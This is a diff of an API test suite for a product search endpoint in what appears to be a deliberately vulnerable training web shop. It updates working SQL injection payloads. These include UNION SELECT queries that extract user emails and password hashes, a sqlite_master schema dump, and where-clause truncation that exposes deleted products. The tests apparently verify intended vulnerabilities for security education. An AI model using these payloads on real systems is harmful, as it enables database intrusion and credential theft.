@@ -8,9 +8,9 @@ const pastebinLeakProduct = config.get('products').filter(({ keywordsForPastebin
 const API_URL = 'http://localhost:3000/api'
 const REST_URL = 'http://localhost:3000/rest'
 
-describe('/rest/product/search', () => {
+describe('/rest/products/search', () => {
   it('GET product search with no matches returns no products', () => {
-    return frisby.get(REST_URL + '/product/search?q=nomatcheswhatsoever')
+    return frisby.get(REST_URL + '/products/search?q=nomatcheswhatsoever')
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -19,7 +19,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search with one match returns found product', () => {
-    return frisby.get(REST_URL + '/product/search?q=o-saft')
+    return frisby.get(REST_URL + '/products/search?q=o-saft')
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -28,7 +28,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search fails with error message that exposes ins SQL Injection vulnerability', () => {
-    return frisby.get(REST_URL + '/product/search?q=\';')
+    return frisby.get(`${REST_URL}/products/search?q=';`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -36,7 +36,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search SQL Injection fails from two missing closing parenthesis', () => {
-    return frisby.get(REST_URL + '/product/search?q=\' union select null,id,email,password,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=' union select id,email,password from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -44,7 +44,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search SQL Injection fails from one missing closing parenthesis', () => {
-    return frisby.get(REST_URL + '/product/search?q=\') union select null,id,email,password,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=') union select id,email,password from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -52,7 +52,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', () => {
-    return frisby.get(REST_URL + '/product/search?q=\')) union select * from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select * from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -60,7 +60,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
-    return frisby.get(REST_URL + '/product/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\' from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
@@ -68,50 +68,63 @@ describe('/rest/product/search', () => {
         name: '2',
         description: '3',
         price: '4',
-        image: '5',
-        createdAt: '6',
-        updatedAt: '7'
+        deluxePrice: '5',
+        image: '6',
+        createdAt: '7',
+        updatedAt: '8'
       })
   })
 
   it('GET product search can create UNION SELECT with Users table and required columns', () => {
-    return frisby.get(REST_URL + '/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
-        name: 1,
-        description: 'admin@' + config.get('application.domain'),
-        price: insecurity.hash('admin123')
+        id: 1,
+        price: 'admin@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('admin123')
       })
       .expect('json', 'data.?', {
-        name: 2,
-        description: 'jim@' + config.get('application.domain'),
-        price: insecurity.hash('ncc-1701')
+        id: 2,
+        price: 'jim@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('ncc-1701')
       })
       .expect('json', 'data.?', {
-        name: 3,
-        description: 'bender@' + config.get('application.domain')
-        // no check for Bender's password as it might have already been changed by the CSRF test
+        id: 3,
+        price: 'bender@' + config.get('application.domain')
+        // no check for Bender's password as it might have already been changed by different test
       })
       .expect('json', 'data.?', {
-        name: 4,
-        description: 'bjoern.kimminich@googlemail.com',
-        price: insecurity.hash('bW9jLmxpYW1lbGdvb2dAaGNpbmltbWlrLm5yZW9qYg==')
+        id: 4,
+        price: 'bjoern.kimminich@gmail.com',
+        deluxePrice: insecurity.hash('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
       })
       .expect('json', 'data.?', {
-        name: 5,
-        description: 'ciso@' + config.get('application.domain'),
-        price: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
+        id: 5,
+        price: 'ciso@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('mDLx?94T~1CfVfZMzw@sJ9f?s3L6lbMqE70FfI8^54jbNikY5fymx7c!YbJb')
       })
       .expect('json', 'data.?', {
-        name: 6,
-        description: 'support@' + config.get('application.domain'),
-        price: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
+        id: 6,
+        price: 'support@' + config.get('application.domain'),
+        deluxePrice: insecurity.hash('J6aVjTgOpRs$?5l+Zkq2AYnCE@RF§P')
+      })
+  })
+
+  it('GET product search can create UNION SELECT with sqlite_master table and required column', () => {
+    return frisby.get(`${REST_URL}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
+      .expect('status', 200)
+      .expect('header', 'content-type', /application\/json/)
+      .expect('json', 'data.?', {
+        id: 'CREATE TABLE `BasketItems` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, UNIQUE (`BasketId`, `ProductId`))'
+      })
+      .expect('json', 'data.?', {
+        id: 'CREATE TABLE sqlite_sequence(name,seq)'
       })
   })
 
   it('GET product search cannot select logically deleted christmas special by default', () => {
-    return frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer')
+    return frisby.get(REST_URL + '/products/search?q=seasonal%20special%20offer')
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -120,7 +133,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', () => {
-    return frisby.get(REST_URL + '/product/search?q=seasonal%20special%20offer\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=seasonal%20special%20offer'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -129,7 +142,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', () => {
-    return frisby.get(REST_URL + '/product/search?q=' + christmasProduct.name + '\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=${christmasProduct.name}'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -139,7 +152,7 @@ describe('/rest/product/search', () => {
   })
 
   it('GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause', () => {
-    return frisby.get(REST_URL + '/product/search?q=' + pastebinLeakProduct.name + '\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=${pastebinLeakProduct.name}'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -154,7 +167,7 @@ describe('/rest/product/search', () => {
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
         const products = json.data
-        return frisby.get(REST_URL + '/product/search?q=')
+        return frisby.get(REST_URL + '/products/search?q=')
           .expect('status', 200)
           .expect('header', 'content-type', /application\/json/)
           .then(({ json }) => {
@@ -169,7 +182,7 @@ describe('/rest/product/search', () => {
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
         const products = json.data
-        return frisby.get(REST_URL + '/product/search')
+        return frisby.get(REST_URL + '/products/search')
           .expect('status', 200)
           .expect('header', 'content-type', /application\/json/)
           .then(({ json }) => {
